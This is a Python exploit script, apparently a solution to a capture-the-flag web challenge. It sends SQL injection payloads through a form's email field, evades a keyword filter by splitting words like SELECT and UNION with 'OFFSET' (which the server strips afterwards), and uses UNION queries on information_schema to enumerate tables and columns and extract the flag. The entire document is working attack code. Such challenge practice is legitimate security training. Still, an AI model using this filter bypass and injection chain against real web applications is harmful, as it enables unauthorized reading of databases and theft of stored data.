import requests
import re

url = "http://no-time.challs.olicyber.it/database.php"

def obfuscate(sql):
    # The server filters keywords sequentially, with 'OFFSET' being last.
    # We inject 'OFFSET' into blocked words (e.g., 'SELECT' -> 'SELOFFSETECT').
    # The server removes 'OFFSET' at the end, reconstructing our malicious keywords
    # after the check for them has already passed.
    keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'FLAG']
    for kw in keywords:
        replacement = kw[:len(kw)//2] + 'OFFSET' + kw[len(kw)//2:]
        sql = sql.replace(kw, replacement)
    return sql

def inject(sql):
    # 1. "dummy'" ensures the first query returns nothing.
    # 2. We inject our UNION payload.
    # 3. "-- " comments out the rest of the original query.
    payload = f"dummy' {obfuscate(sql)} -- "
    r = requests.post(url, data={'email': payload})
    match = re.search(r"La mail \((.*?)\)", r.text)
    return match.group(1) if match else "No result"

# Step 1: Dump table names to find the target
print("[1] Enumerating tables...")
tables = inject("UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()")
print(f"Found: {tables}")

# Step 2: Find the flag table
target_table = [t for t in tables.split(',') if 'flag' in t][0]
# Need to obfuscate FLAG in the table name too!
target_table_obfuscated = target_table.replace('flag', 'flOFFSETag')

print(f"\n[2] Dumping columns from '{target_table}'...")
columns = inject(f"UNION SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{target_table}'")
print(f"Columns: {columns}")

# Step 3: Dump the flag
print(f"\n[3] Extracting flag from '{target_table}'...")
# Try different approaches - use obfuscated table name
flag = inject(f"UNION SELECT * FROM {target_table_obfuscated}")
if flag == "No result":
    flag = inject(f"UNION SELECT 1 FROM {target_table_obfuscated}")
print(f"Flag: {flag}")